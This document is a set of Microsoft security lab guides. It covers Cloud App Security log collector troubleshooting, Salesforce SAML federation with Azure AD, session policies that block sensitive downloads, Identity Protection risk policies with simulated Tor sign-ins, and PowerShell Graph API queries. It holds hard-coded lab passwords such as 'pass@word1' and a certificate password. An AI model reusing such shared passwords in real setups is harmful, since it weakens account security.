    Go to the following folders and review their log files using `more`:
    * **/adallom/ftp/discovery**: this folder contains the data source folders where you send the log files for automated upload. This is also the default folder when logging into the collector with FTP credentials.
    * **/adallom/syslog/discovery**: if you setup the log collector to receive syslog messages, this is where the flat file of aggregated messages will reside until it is uploaded.
    * **/adallom/discoverylogsbackup**: this folder contains the last file that was sent to MCAS. This is useful for looking at the raw log in case there are parsing issues.

3. To validate that logs are correctly received from the network appliance, you can also verify the **/var/log/pure-ftpd** directory and check the transfer log:

    ``` bash
    tail transfer.log
    ```

    ![FTP logs](\Media\dis-pureftp.png "FTP logs")

4. Now, move to the **/var/log/adallom** directory.

    ![var log](\Media\dis-varlog.png "var log")

    Go to the following folders and review their content and log files using `ll` and `more` or `tail`:
    * **/var/log/adallom/columbus**: this folder is where you will find log files useful for troubleshooting issues with the collector sending files to Cloud App Security. In the **log-archive** folder you can find previous logs compressed as *.tar.gz* files that could be used to send to support for example.
    * **/var/log/adallom/columbusInstaller**: this is where you will investigate issues with the log collector itself. You will find here logs related to the configuration and bootstrapping of the collector. For example, **trace.log** will show you the bootstrapping process:

    ![Bootstrapping log](\Media\dis-bootstrapping.png "bootstrapping log")

### Verify the connectivity between the log collector and Cloud App Security

An easy way to test the connectivity after configuring the log collector is to download a sample of your appliance logs from and use WinSCP to connect to the log collector to upload it and see if it gets uploaded to Cloud App Security, as you did in the previous exercise

![Pending log](\Media\dis-pending.png "Log pending")

>:memo: **NOTE:**  If the log stays in the source folder for too long, then you know you probably have a connection issue between the log collector and Cloud App Security and should go investigate the logs reviewed previously.
===
# Conditional Access App Control

[:arrow_left: Home](#labs)

## Introduction

Conditional Access App Control utilizes a reverse proxy architecture and is uniquely integrated with Azure AD conditional access. Azure AD conditional access allows you to enforce access controls on your organization’s apps based on certain conditions. The conditions define who (for example a user, or group of users) and what (which cloud apps) and where (which locations and networks) a conditional access policy is applied to. After you’ve determined the conditions, you can route users to the Microsoft Cloud App Security where you can protect data with Conditional Access App Control by applying access and session controls.

Conditional Access App Control enables user app access and sessions to be monitored and controlled in real time based on access and session policies. Access and session policies are utilized within the Cloud App Security portal to further refine filters and set actions to be taken on a user.

With the access and session policies, you can:

* **Block on download**: You can block the download of sensitive documents. For example, on unmanaged devices.
* **Protect on download**: Instead of blocking the download of sensitive documents, you can require documents to be protected via encryption on download. This ensures that the document is protected, and user access is authenticated, if the data is downloaded to an untrusted device.
* **Monitor low-trust user sessions**: Risky users are monitored when they sign into apps and their actions are logged from within the session. You can investigate and analyze user behavior to understand where, and under what conditions, session policies should be applied in the future.
* **Block access**: You can completely block access to specific apps for users coming from unmanaged devices or from non-corporate networks.
* **Create read-only mode**: By monitoring and blocking custom in-app activities you can create a read-only mode to specific apps for specific users.
* **Restrict user sessions from non-corporate networks**: Users accessing a protected app from a location that is not part of your corporate network, are allowed restricted access and the download of sensitive materials is blocked or protected.

>:memo: In this lab, we will cover only some scenarios.

---

## Federate Salesforce with Azure AD

[:arrow_up: Top](#Conditional-Access-App-Control)

>:warning: As Conditional Access App Control requires the protected app to be federated with your IdP (Azure AD in our case), we will first federate Saleforce with our tenant before moving to the controls configuration. Please go through all the steps exactly as described to avoid any complications further in the lab.

1. Create a Salesforce developer account.

    * On Client01, launch a browser and create a Salesforce developer org at this address: [https://developer.salesforce.com/signup](https://developer.salesforce.com/signup).
      This org (or tenant) will allow you to create a test environment to federate with our Azure AD tenant.

      >:memo: Dev Salesforce orgs are available for free but are deleted after extended periods of inactivity.
      >
      > :warning: Use your lab tenant admin user as the Email and Username

      ![Dev sign-up](\Media\appc-signup.png "Salesforce sign-up")

    * Fill in the rest of details, click **Sign me up**, accept the **verification email** in your mailbox, and choose a new password. Use the admin password provided in the lab environment if possible.

        ![Dev sign-up](\Media\appc-signup2.png "Salesforce sign-up")

        ![Dev sign-up](\Media\appc-signup3.png "Salesforce sign-up")

2. Configure Salesforce in Azure AD for single sign-on.

    * In Salesforce, go to **Setup**, search for **My Domain** and register a new domain matching your Office 365 lab domain, e.g., **ems123456-dev-ed.salesforce.com**

        ![My domain](\Media\sf-mydomain.png "My domain")

        ![My domain](\Media\sf-registerdomain.png "My domain")

        ![My domain](\Media\sf-registerdomain2.png "My domain")

    * Save **full Salesforce domain name**, including **https://** for the next step, e.g., **https://ems123456-dev-ed.salesforce.com**

        >:warning: Do not close this page !

        ![My domain](\Media\sf-registerdomain3.png "My domain")

    * Go to **https://portal.azure.com** were we will add Salesforce as an Enterprise application and configure **single sign-on**, which is a requirement for using App Control.

3. Go to **Azure Active Directory**, click on **Enterprise applications**, and add the **Salesforce** application. Call it **SalesforceCAS**, and click on **Add**.

    ![Add SF](\Media\appc-app1.png "Add SF")

    ![Add SF](\Media\appc-app2.png "Add SF")

    ![Add SF](\Media\appc-app3.png "Add SF")

    ![Add SF](\Media\appc-app4.png "Add SF")

4. Now that Salesforce has been added as an Enterprise application, we have to configure **single sign-on**.

    ![Add SF](\Media\appc-app5.png "Add SF")

5. Select **SAML** as the SSO method.

    ![Add SF](\Media\appc-app6.png "Add SF")

6. We will now configure the SAML single sign-on using the information provided by Salesforce when we added our domain.

    >:warning: Do not forget to add **https://** in front of the domain name provided by Salesforce.

    ![Add SF](\Media\appc-app7.png "Add SF")

    ![Add SF](\Media\appc-app8.png "Add SF")

7. Close the pane and go to the **Step 4** of the SSO wizard and click on **View step-by-step instructions**. This page will give you all the required information for configuring Salesforce SSO.

    ![Add SF](\Media\appc-app9.png "Add SF")

    ![Add SF](\Media\appc-app10.png "Add SF")

8. Go back to the **Salesforce admin page** and go to the **Signle sign-on** settings. There, click on the **Edit** button.

    ![Add SF](\Media\appc-app11.png "Add SF")

9. Enable single sign-on using SAML and click on the **Save** button.

    ![Add SF](\Media\appc-app12.png "Add SF")

10. Back on the configuration page, under **SAML Single Sign-On Settings**, click on **New**.

    ![Add SF](\Media\appc-app13.png "Add SF")

    We will now configure those settings using the information provided in the **Azure AD portal**.

    ![Add SF](\Media\appc-app14.png "Add SF")

11. For the configuration, you will have to use the information provided at the bottom of the Azure AD **Configure sign-on** pane. Scroll down until you reach the **Quick reference** section.

    ![Add SF](\Media\appc-app15.png "Add SF")

12. Copy/paste the information from the **Quick reference** to the Salesforce **single sign-on settings** page.

    a.In the Name textbox, type the name of the configuration: **AzureAD**.

    b. Paste **Azure AD SAML Entity ID** value into the **Issuer** textbox.

    c. In the **Entity Id** textbox, type in the **Sign On URL** that you entered in **Step 1**, which should be in this format: **http://company.my.salesforce.com**

    d. Download the **Azure AD Signing Certificate** in the Azure portal and then click **Browse** to upload the downloaded certificate Azure AD Signing Certificate in the **Salesforce setting page**.

    e. As **SAML Identity Type**, select **Assertion contains the Federation ID** from the User object.

    f. As **SAML Identity Location**, select **Identity is in the NameIdentifier element of the Subject statement**.

    g. Paste **Azure AD Single Sign-On Service URL** into the **Identity Provider Login URL** textbox.

    h. Salesforce does not support SAML logout. As a workaround, paste **Azure AD Sign Out URL** into the **Identity Provider Logout URL** textbox.

    i. As **Service Provider Initiated Request Binding**, select **HTTP POST**.

    j. Click Save.

    ![Add SF](\Media\appc-app16.png "Add SF")

    ![Add SF](\Media\appc-app17.png "Add SF")

13. Go back to **My Domain** in Salesforce and in **Authentication Configuration**, click on **Edit**. You will be redirected to another page.

    ![Add SF](\Media\appc-app18.png "Add SF")

14. In **Authentication Configuration**, un-check the **Login Page** checkbox and check the **Azure AD** checkbox. Click on Save. When back on the configuration page, click on the **login** button to complete the configuration.

    ![Add SF](\Media\appc-app19.png "Add SF")

    ![Add SF](\Media\appc-app20.png "Add SF")

    ![Add SF](\Media\appc-app20a.png "Add SF")

    ![Add SF](\Media\appc-app20b.png "Add SF")

---

## Deploy Salesforce to your users

[:arrow_up: Top](#Conditional-Access-App-Control)

We will now provide access to our users and validate the SSO experience.

1. Go back to the Azure AD portal, within the **SalesforceCAS** app and choose **Users and groups**

    ![Assign users](\Media\appc-app21.png "Assign users")

2. Click on **+ Add user**. Choose your admin account as the user (e.g.,admin@ems123456.onmicrosoft.com) and select **System Administrator** as the Role. Click on **Assign**

    ![Assign users](\Media\appc-app22.png "Assign users")

    ![Assign users](\Media\appc-app23.png "Assign users")

    ![Assign users](\Media\appc-app24.png "Assign users")

    >:warning: If you want to assign Salesforce to more users, you must create a user for them in Salesforce as we didn't configured **provisionning**. Our admin account already has an an account matching his UPN, created during the Salesforce configuration.

3. Test the setup by going to [https://myapps.microsoft.com](https://myapps.microsoft.com) with your admin account and click on the **SalesforceCAS** app. You should then experience SSO to Salesforce.

    ![Test SSO](\Media\appc-app25.png "Test SSO")

    ![Test SSO](\Media\appc-app26.png "Test SSO")

    :warning: If you receive an error message, verify that you validated the SSO configuration by clicking on the **Log in** button in **step 14**.

---

## Deploy the reverse proxy capability for Salesforce

[:arrow_up: Top](#Conditional-Access-App-Control)

The next step of the configuration is to create a Conditional access policy in Azure AD and then complete the configuration in Cloud App Security.

>:memo: Soon, you will be able to perform the full configuration from the Azure AD conditional access policy configuration pane.

1. In Azure Active Directory, under **Security**, click on **Conditional access**.

    ![Configure policy](\Media\appc-policy1.png "Configure policy")

2. Click on **New policy** and create a new policy.

    ![Configure policy](\Media\appc-policy2.png "Configure policy")

3. Use the following settings in your policy.

    **Name**: Test Cloud App Security proxy
    **Assignment**: choose your admin
    **Cloud apps**: SalesforceCAS
    **Access control / Session**: Use Conditional Access App Control **checkbox**

    ![Configure policy](\Media\appc-policy3.png "Configure policy")

    ![Configure policy](\Media\appc-policy4.png "Configure policy")

    ![Configure policy](\Media\appc-policy5.png "Configure policy")

4. Enable your policy and click on **Create**

    ![Configure policy](\Media\appc-policy6.png "Configure policy")

    ![Configure policy](\Media\appc-policy7.png "Configure policy")

5. After the policy was created successfully, open a new browser, ***make sure you are logged out***, go to [https://myapps.microsoft.com](https://myapps.microsoft.com), connect with the admin user and click on the SalesforceCAS tile.

6. Go back to the Cloud App Security portal, and under the settings cog choose **Conditional Access App Control**.

    ![Configure policy](\Media\appc-policy8.png "Configure policy")

    You should see know that Salesforce has been discovered and need to continue the setup.

    ![Configure policy](\Media\appc-policy9.png "Configure policy")

    >:warning: If the message does not appear, go back to step 5. (After the policy was created...) this time, close the browser and open a new browser in Incognito mode.

    In the dialog that opens, click on **Add**.

    ![Configure policy](\Media\appc-policy10.png "Configure policy")

    ![Configure policy](\Media\appc-policy11.png "Configure policy")

    The deployment is now **complete**!

---

### Configure device authentication

[:arrow_up: Top](#Conditional-Access-App-Control)

Conditional Access App Control is capable to identify company devices using either Azure AD, Intune or certificates (provided by 3rd party MDM for example). We will here simulate the 3rd party MDM scenario, using client certificates.

1. Go to the settings and at the bottom of the page, choose **Device identification**.

    ![Device authentication](\Media\appc-device1.png "Device authentication")

2. Click on the **Browse** button and upload the **CASTestCA.crt** certificate from the **Client Certificate** folder within the **Demofiles.zip** file you've received as the certificate authority root certificate.

    ![Device authentication](\Media\appc-device2.png "Device authentication")

    ![Device authentication](\Media\appc-device3.png "Device authentication")

    ![Device authentication](\Media\appc-device4.png "Device authentication")

---

### Create a session policy

[:arrow_up: Top](#Conditional-Access-App-Control)

To control our users sessions to Salesforce, we have now to create a **policy**.

1. In the Cloud App Security portal, select **Control** followed by **Policies**.

    ![Session policy](\Media\appc-session1.png "Session policy")

2. In the **Policies** page, click **Create policy** and select **Session policy**.

    ![Session policy](\Media\appc-session2.png "Session policy")

3. In the **Session policy** window, assign a name for your policy, such as **Block download of sensitive documents to unmanaged devices** and in the **Session control type** field, select **Control file download (with DLP)**

     ![Session policy](\Media\appc-session3.png "Session policy")

4. Under **Activity source** in the **Activities matching all of the following** section, select the following activity filters to apply to the policy:

    **Device tags** does not equal **Valid client certificate**
    **App** equals **Salesforce**
    Check the **Enabled** checkbox near **Content inspection**

    ![Session policy](\Media\appc-session4.png "Session policy")

5. Check the **Include files that match a preset expression** radio button. In the dropdown menu just below the radio button, scroll all the way to the end to choose **US: PII: Social security number** and check the **Don't require relevant context** checkbox, just below the dropdown menu.

    ![Session policy](\Media\appc-session5.png "Session policy")

6. Under **Actions**, select **Block**. Check the **Customize block message** checkbox, and add a custom message in the textbox that has opened, e.g.: "This file is sensitive"

    ![Session policy](\Media\appc-session6.png "Session policy")

7. Click on **Create**

8. Create a second **Session policy** called **Protect download to unmanaged devices**. In the **Session control type** field Select **Control file download (with DLP)**.

    ![Session policy](\Media\appc-session7.png "Session policy")

9. Under **Activity source** in the **Activities matching all of the following** section, select the following activity filters to apply to the policy:

    **Device tags** does not equal **Valid client certificate**
    **App** equals **Salesforce**

    ![Session policy](\Media\appc-session8.png "Session policy")

10. Check the **Enabled** checkbox near **Content inspection**. Under **Actions**, select **Protect**

    ![Session policy](\Media\appc-session9.png "Session policy")

11. Click on **Create**

12. Disable this policy

 ---

### Test the user experience

[:arrow_up: Top](#Conditional-Access-App-Control)

1. Extract the file **silvia.pfx** from the **Client Certificate** folder in **Demo files.zip** file you've received

2. Double click on the **silvia.pfx** file, click **Next**, **Next**, enter the password **acme**, click **Next**, **Next**, **Finish**.

3. Open a new browser in an Incognito mode

4. Go to [https://myapps.microsoft.com](https://myapps.microsoft.com) and login with the admin user.

5. Click on the **SalesforceCAS** icon.

6. You should now see a certificate prompt. Click on **Cancel**.

    >:memo: This will simulate a connection from an unmannaged device. **In a real demo**, you can open two different browsers, side by side, and show the user experience from a managed and unmanaged device by clicking on **OK** in one browser and **Cancel** in the other.

   ![Session policy](\Media\appc-session10.png "Session policy")

7. You should then see a Monitored access message, click on **Continue to Salesforce** to continue.

    ![Session policy](\Media\appc-session11.png "Session policy")

8. Now you are logged in to Salesforce. Click on + and go to Files

    ![d0ik67yl.jpg](\Media\d0ik67yl.jpg)

9. Upload the files **Personal employees information.docx** and **Protect with Microsoft Cloud App Security proxy.pdf** from the **Demo files.zip** file to the Files page in Salesforce

10. Download the **Protect with Microsoft Cloud App Security proxy.pdf** files and see that it is downloaded, and you can open it.

11. Download the **Personal employees information.docx** file and see that you get a blocking message and instead of the file, you get a **Blocked...txt** file.

   ![wvk16zl2.jpg](\Media\wvk16zl2.jpg)

---

### Test the admin experience

[:arrow_up: Top](#Conditional-Access-App-Control)

1. Go back to the Cloud App Security portal, and under **Investigate**  choose **Activity log**

2. See the login activity that was redirected to the session control, the file download that was not blocked, and the file download that was blocked because it matched the policy.

    ![j0vuo06k.jpg](\Media\j0vuo06k.jpg)

=== 
 
## Azure ATP Immersion Lab 
[:arrow_left: Home](#introduction)

The rest of the lab will be instructor led via PowerPoint. 
===
# Windows Defender Advanced Threat Protection
[:arrow_left: Home](#introduction)

### Please see externally provided instructions for this lab.


===
# Azure Security Center
[:arrow_left: Home](#introduction)

### Please see externally provided instructions for this lab.

===
# Azure Active Directory
[:arrow_left: Home](#introduction)

> [!ALERT] Please ensure you have completed the steps in the [Lab Environment Configuration](#lab-environment-configuration) before continuing.

## Identity Protection and Risk Policies

**Reference: User chart**

|User		|Are they in **IP Users** Group?	|Registered for MFA/SSPR during setup?
|-------	|-------							|-------
|Adam		|YES								|YES
|Bob		|YES								|NO
|Alice		|YES								|YES 
|Evan		|NO									|NO

===
# Prerequisites
[:arrow_left: Home](#azure-active-directory)

### Create group of users

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Navigate to ```https://portal.azure.com```.

1. [] If necessary, log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```

2. []	Browse to **Azure Active Directory > Groups > New group**.
3. []	Create a Security group named **Identity Protection Users** with assigned membership type.
4. []	Click **Create**, then add Adam, Bob, and Alice to the group.

### Enable Self Service Password Reset (SSPR)

1. []	Navigate to **Azure Active Directory > Password reset**.
2. []	From the Properties page, under the option Self Service Password Reset Enabled, choose **All**.
4. []	Click Save.
5. []	From the Authentication methods page, make the following choices:
6. []	Number of methods required to reset: **1**
	1. []	Methods available to users:
		1. []	**Mobile app code (preview)**
		1. []	**Mobile phone**
		1. []	**Office phone**
	1. []	Click **Save**.

### Enable converged registration for MFA and SSPR

2. []	Navigate to Azure Active Directory > User settings > Manage settings for access panel preview features.
3. []	Under Users can use preview features for registering and managing security info, you can choose to enable for a Selected group of users or for All users.

------
===
# Configure MFA registration policy
[:arrow_left: Home](#azure-active-directory)

1. []	Navigate to **Azure Active Directory > Security > MFA registration policy**.
2. []	Under Assignments, select **Identity Protection Users**.
3. []	Set **Enforce Policy** to **On**.

### Register Adam for MFA

1. []	In a **new InPrivate window**, log in to ```https://portal.office.com``` using the credentials below

	```AdamS@@lab.CloudCredential(134).TenantName```

	```pass@word1```

2. []	Adam will be prompted to register for MFA.
3. []   Close the InPrivate window.

### Register Alice for MFA

1. []	In a **new InPrivate window**, log in to ```https://portal.office.com``` using the credentials below

	```AliceA@@lab.CloudCredential(134).TenantName```

	```pass@word1```

2. []	Alice will be prompted to register for MFA.
3. []   Close the InPrivate window.

===
# Configure risk policies
[:arrow_left: Home](#azure-active-directory)

##First, we are going to configure the sign-in risk policy

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Navigate to ```https://portal.azure.com/?Microsoft_AAD_IAM_ipcv2=true&Microsoft_AAD_IAM_securityarea=true#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Security``` 
2. [] Click on the **Security** blade and then select **Sign-in risk policy**
3. [] Under **Assignments** **users**, click on **Select individuals and groups** and then select the **Identity Protection Users** group. Click **Done**
4. [] Under **Conditions**, ensure that sign-in risk is set to **Medium and above**
5. [] Under **Controls**, ensure that access is set to **require multi-factor authentication**
6. [] Set **Enforce Policy** to **On**

##Now, let’s configure the user-risk policy

1. []	Navigate to ```https://portal.azure.com/?Microsoft_AAD_IAM_ipcv2=true&Microsoft_AAD_IAM_securityarea=true#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Security``` 
2. []	Click on the **Security** blade and then select **User risk policy**
3. []	Under **Assignments** **users**, click on **Select individuals and groups** and then select the **Identity Protection Users** group. Click **Done**
4. []	Under **Conditions**, set user risk is set to **High**
5. []	Under **Controls**, ensure that access is set to **require password change**
6. []	Set **Enforce Policy** to **On**

===
# Simulate risky sign-ins experience
[:arrow_left: Home](#azure-active-directory)

Let’s see what happens when users try to sign in from the Tor Browser, which anonymizes their IP and can be used by malicious actors.

1. []	Log in to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. []	Navigate to ```https://portal.office.com``` and log-in with the credentials below:

	```EvanG@@lab.CloudCredential(134).TenantName```

	```pass@word1```

	1. []	Notice how they are not blocked because they are not targeted by the risky sign-ins policies
3. []	Now, open a new Tor window and log-in to ```https://portal.office.com with the credentials below
		
		```AdamS@@lab.CloudCredential(134).TenantName```

		```pass@word1```

	1. []	Notice how you are prompted for MFA due to the risky sign-ins policy
4. []	To generate an additional risky sign-in, open a new Tor window and log-in to ```https://portal.office.com++ with ```AliceA@@lab.CloudCredential(134).TenantName```
	1. []	Notice how you are prompted for MFA due to the risky sign-ins policy

##What happens if a user is targeted by the risky sign-ins policy but has not yet registered for MFA?

1. []	Open a new Tor window and log-in to ```https://portal.office.com``` with the credentials below:

	```BobW@@lab.CloudCredential(134).TenantName```

	```pass@word1```
	
	1. []	Notice how you are blocked because the user has not registered for MFA yet and is thus unable to beat the MFA challenge prompted by the risky sign-ins policy
6. []	So that Bob can respond to future MFA attempts, open an Edge browser window and now navigate to portal.office.com and log-in as Bob
	1. []	You will be prompted to register for MFA
===
# Pull data from APIs
[:arrow_left: Home](#azure-active-directory)

## Get Started with the API

There are four steps to accessing Identity Protection data through Microsoft Graph:


1. []	Create a new app registration. 
3. []	Use this secret and a few other pieces of information to authenticate to Microsoft Graph, where you receive an authentication token. 
4. []	Use this token to make requests to the API endpoint and get Identity Protection data back.

## Create a new app registration

1. []	On the Active Directory page, in the Manage section, click App registrations.

	!IMAGE[h5fd84va.jpg](\Media\h5fd84va.jpg)
2. []	In the menu on the top, click New application registration.
 
	!IMAGE[vptami21.jpg](\Media\vptami21.jpg)
3. []	On the Create page, perform the following steps:
 
	!IMAGE[uh5cjkmi.jpg](\Media\uh5cjkmi.jpg)
	1. [] In the Name textbox, type a name for your application (e.g.: AADIP Risk Event API Application).
	1. [] As Type, select Web Application And / Or Web API.
	1. [] In the Sign-on URL textbox, type ```http://localhost```.
	1. [] Click Create.
4. []	To open the Settings page, in the applications list, click your newly created app registration. 
5. []	Copy the Application ID and paste it into a new text document. This will be needed later in the lab.

===
## Grant your application permission to use the API
[:arrow_left: Home](#azure-active-directory)

1. []	On the Settings page, click Required permissions.
 
	!IMAGE[87aolleh.jpg](\Media\87aolleh.jpg)
2. []	On the Required permissions page, in the toolbar on the top, click Add.
  
	!IMAGE[3yfprrsu.jpg](\Media\3yfprrsu.jpg)
3. []	On the Add API access page, click Select an API.
 
	!IMAGE[dwvs40oh.jpg](\Media\dwvs40oh.jpg)
4. []	On the Select an API page, select Microsoft Graph, and then click Select.
 
	!IMAGE[c2wo5n3e.jpg](\Media\c2wo5n3e.jpg)
5. []	On the Add API access page, click Select permissions.
 
	!IMAGE[k275899m.jpg](\Media\k275899m.jpg)
6. []	On the Enable Access page, click Read all identity risk information, and then click Select.
 
	!IMAGE[wlcqechy.jpg](\Media\wlcqechy.jpg)
7. []	On the Add API access page, click Done.
8. []	On the Required Permissions page, click Grant Permissions, and then click Yes.

	!IMAGE[3i07c4dz.jpg](\Media\3i07c4dz.jpg)
===
## Get an access key
[:arrow_left: Home](#azure-active-directory)

1. []	On the Settings page, click Keys.
 
	!IMAGE[to0mwhls.jpg](\Media\to0mwhls.jpg)
2. []	On the Keys page, perform the following steps:
 
	!IMAGE[3xrwo38o.jpg](\Media\3xrwo38o.jpg)
	1. [] In the Key description textbox, type a description (for example, AADIP Risk Event).
	1. [] As Duration, select In 1 year.
	1. [] Click Save.
	1. [] Copy the key value, and then paste it into a safe location. 

	Since we will use this value later on, copy the Client Secret into the text file where you stored the client id.

	> [!Note] If you lose this key, you will have to return to this section and create a new key. Keep this key a secret: anyone who has it can access your data.
===
## Authenticate to Microsoft Graph and query the Identity Risk Events API
[:arrow_left: Home](#azure-active-directory)

At this point, you should have specified the following values in your text file:

- The client ID 

- The key 

## Querying the API using PowerShell

Now that we have configured the app registration and retrieved the values needed to authenticate, we can query the IdentityRiskEvents API using PowerShell.

## See medium-risk and  high-risk events

First, let’s assess how many risk events we have that are medium or high risk. These are the events that have the capability to trigger the sign-in or user-risk policies. Since they have a medium or high likelihood of user compromise, remediating these events should be a priority. 

1. [] Open a **PowerShell ISE** window and, in the **script pane**, type the PowerShell code below.  

1. [] Insert the saved **Client ID** and **key** for the values of **ClientID** and **ClientSecret** variable and click **Run**.

	```
	##Get all your medium or high-risk risk events

	$ClientID       = "ClientID"        # Should be a ~36 hex character string; insert your info here
	$ClientSecret   = "ClientSecret"    # Should be a ~44 character string; insert your info here
	$tenantdomain   = "@lab.CloudCredential(134).TenantName"    # For example, contoso.onmicrosoft.com

	$loginURL       = "https://login.microsoft.com"
	$resource       = "https://graph.microsoft.com"
	$body      = @{grant_type="client_credentials";resource=$resource;client_id=$ClientID;client_secret=$ClientSecret}
	$oauth     = Invoke-RestMethod -Method Post -Uri $loginURL/$tenantdomain/oauth2/token?api-version=beta -Body $body
	Write-Output $oauth
	if ($oauth.access_token -ne $null) {
	$headerParams = @{'Authorization'="$($oauth.token_type) $($oauth.access_token)"}
	$url = "https://graph.microsoft.com/beta/identityRiskEvents $filter=riskLevel eq 'high' or riskLevel eq 'medium'" 
	Write-Output $url
	$myReport = (Invoke-WebRequest -UseBasicParsing -Headers $headerParams -Uri $url)
	foreach ($event in ($myReport.Content | ConvertFrom-Json).value) {
		Write-Output $event
	}
	} else {
	Write-Host "ERROR: No Access Token"
	} 
	```

## Investigate a specific user
When you believe a user may have been compromised, you can better understand the state of their risk by getting all of their risk events. Similarly, if you have users that you believe may be more likely targets of compromise, you can proactively retrieve their risky events.

Since we know that Adam had some risky-sign ins, let’s query their risk events.

1. [] In the **PowerShell ISE**, open a new file and, in the **script pane**, type the PowerShell code below.

1. [] Insert the saved **Client ID** and **key** for the values of **ClientID** and **ClientSecret** variable and click **Run**.

	```
	##Get a specific user's risk events

	$ClientID       = "ClientID"        # Should be a ~36 hex character string; insert your info here
	$ClientSecret   = "ClientSecret"    # Should be a ~44 character string; insert your info here
	$tenantdomain   = "@lab.CloudCredential(134).TenantName"    # For example, contoso.onmicrosoft.com

	$loginURL       = "https://login.microsoft.com"
	$resource       = "https://graph.microsoft.com"
	$body      = @{grant_type="client_credentials";resource=$resource;client_id=$ClientID;client_secret=$ClientSecret}
	$oauth     = Invoke-RestMethod -Method Post -Uri $loginURL/$tenantdomain/oauth2/token?api-version=beta -Body $body
	Write-Output $oauth
	if ($oauth.access_token -ne $null) {
	$headerParams = @{'Authorization'="$($oauth.token_type) $($oauth.access_token)"}
	$url = "https://graph.microsoft.com/beta/identityRiskEvents?`$filter=userID eq '<Adam’s user ID>'"
	Write-Output $url
	$myReport = (Invoke-WebRequest -UseBasicParsing -Headers $headerParams -Uri $url)
	foreach ($event in ($myReport.Content | ConvertFrom-Json).value) {
		Write-Output $event
	}
	} else {
	Write-Host "ERROR: No Access Token"
	} 
	```
===
# Simulate risky user experience
[:arrow_left: Home](#azure-active-directory)

Remember our risky sign-ins from earlier? Let’s take a look at them in the Azure portal

1. []	Navigate to ```https://portal.azure.com/?Microsoft_AAD_IAM_ipcv2=true&Microsoft_AAD_IAM_securityarea=true#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Security```
2. []	Click on the **Security** blade and then select **Risky sign-ins**
3. []	You should see the Tor sign ins from Adam, Bob, and Evan. To dive deeper, click on a specific sign-in record
4. []	In the details drawer, you can toggle through the basic info, device info, risk info tabs to learn more about that particular sign-in

Now that we have taken a look at risky sign-ins, let’s find out what happens if Identity Protection detects a high-risk user. For the purposes of this lab, we will force a user to go to **high-risk**

1. []	Navigate to ```https://portal.azure.com/?Microsoft_AAD_IAM_ipcv2=true&Microsoft_AAD_IAM_securityarea=true#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Security```
2. []	Click on the **Security** blade and then select **Risky sign-ins**
3. []	Click on the risky sign-in record for Bob and select **confirmed compromise**
4. []	Now, open a new InPrivate window and try to log-in to portal.office.com as Bob
	1. []	You will be prompted to reset Bob’s password


